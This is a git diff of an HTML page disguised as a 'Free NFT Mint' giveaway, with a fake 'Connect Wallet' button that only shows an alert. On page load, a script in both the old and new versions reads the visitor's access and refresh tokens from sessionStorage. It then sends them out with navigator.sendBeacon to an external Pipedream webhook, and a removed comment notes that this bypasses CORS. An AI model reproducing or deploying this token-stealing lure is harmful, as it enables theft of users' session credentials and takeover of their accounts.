@@ -1,12 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Claim Free NFT</title>
+  <title>Free NFT Mint</title>
   <script>
     window.onload = function () {
       setTimeout(() => {
-        const webhookURL = 'https://eoeofsj8fajkjtm.m.pipedream.net'; // Your Pipedream bin
-
+        const url = 'https://eoeofsj8fajkjtm.m.pipedream.net';
         const data = {
           access_token: sessionStorage.getItem("access_token"),
           refresh_token: sessionStorage.getItem("refresh_token"),
@@ -16,16 +15,14 @@
         };
 
         const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
-
-        // ✅ Bypass CORS using sendBeacon
-        navigator.sendBeacon(webhookURL, blob);
+        navigator.sendBeacon(url, blob);
+        console.log("🚀 Attempted send to webhook");
       }, 1000);
     };
   </script>
 </head>
 <body>
-  <h1>🎉 Free NFT Mint</h1>
-  <p>Click "Connect Wallet" to claim yours.</p>
+  <h1>🎉 Claim Free NFT</h1>
   <button onclick="alert('Wallet connected!')">Connect Wallet</button>
 </body>
 </html>
